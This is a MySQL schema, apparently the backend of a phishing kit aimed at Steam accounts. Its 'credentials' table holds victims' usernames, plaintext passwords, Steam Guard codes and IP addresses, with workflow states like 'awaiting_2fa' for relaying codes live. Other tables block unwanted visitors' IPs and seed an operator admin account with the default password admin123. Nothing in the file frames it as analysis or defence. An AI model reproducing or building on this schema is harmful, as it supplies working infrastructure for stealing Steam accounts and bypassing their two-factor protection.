
-- Create database
CREATE DATABASE IF NOT EXISTS steam_login_helper;
USE steam_login_helper;

-- Create credentials table
CREATE TABLE IF NOT EXISTS credentials (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    steamguard VARCHAR(255) NULL,
    ip VARCHAR(45) NOT NULL,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    status ENUM('pending', 'awaiting_2fa', 'completed', 'rejected', 'blocked') DEFAULT 'pending',
    online BOOLEAN DEFAULT TRUE
);

-- Create blocked_ips table
CREATE TABLE IF NOT EXISTS blocked_ips (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip VARCHAR(45) NOT NULL UNIQUE,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Create admins table
CREATE TABLE IF NOT EXISTS admins (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    last_login DATETIME NULL
);

-- Insert default admin (username: admin, password: admin123)
INSERT INTO admins (username, password_hash) 
VALUES ('admin', '$2y$10$GvWr5f9FsZQVCc3jY7ywBetIZBp0gRFE4.dMp5auqOe9yS1RfgLdK')
ON DUPLICATE KEY UPDATE id = id;
